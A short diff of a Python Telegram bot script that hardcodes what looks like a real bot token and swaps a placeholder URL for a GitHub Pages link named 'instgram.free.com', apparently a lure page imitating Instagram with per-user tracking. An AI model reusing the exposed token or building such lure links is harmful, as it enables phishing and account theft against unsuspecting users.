@@ -4,7 +4,7 @@ import telebot
 bot = telebot.TeleBot('7920990688:AAEQBP8NAnaXOex-rJnydvnepaG056m_010')
 
 # GitHub Pages base URL
-base_url = 'https://yourusername.github.io/your-repository/index.html?user='
+base_url = 'https://mastermindguddu12.github.io/instgram.free.com//index.html?user='
 
 # Handle the /start command
 @bot.message_handler(commands=['start'])
